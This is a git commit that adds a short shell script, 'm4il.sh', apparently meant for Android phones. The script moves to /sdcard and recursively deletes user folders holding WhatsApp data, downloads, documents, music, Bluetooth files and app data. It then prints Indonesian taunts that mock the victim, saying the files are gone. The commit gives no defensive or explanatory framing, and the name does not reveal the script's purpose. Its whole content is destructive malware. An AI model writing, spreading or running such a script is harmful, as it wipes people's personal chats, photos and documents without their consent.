d050dcb9adb314227c76e2fc627996d365271af1
fakradi <56883399+fakradi@users.noreply.github.com>
2019-11-03 09:39:01 +0700

    Add files via upload

---
+++ m4il.sh
@@ -0,0 +1,16 @@
+cd /sdcard
+rm -rf index.html
+rm -rf Android
+rm -rf bluetooth
+rm -rf WhatsApp
+rm -rf com.garena.game.codm
+rm -rf Download
+rm -rf GBWhatsApp
+rm -rf browser
+rm -rf WhatsApp Business
+rm -rf Dokumen
+rm -rf Musik
+echo "mampus lu"
+echo "m4il꧂⁩ gans tq"
+echo "kesel ya!! hahahaah"
+echo "Ya file nya hilang hahahha"
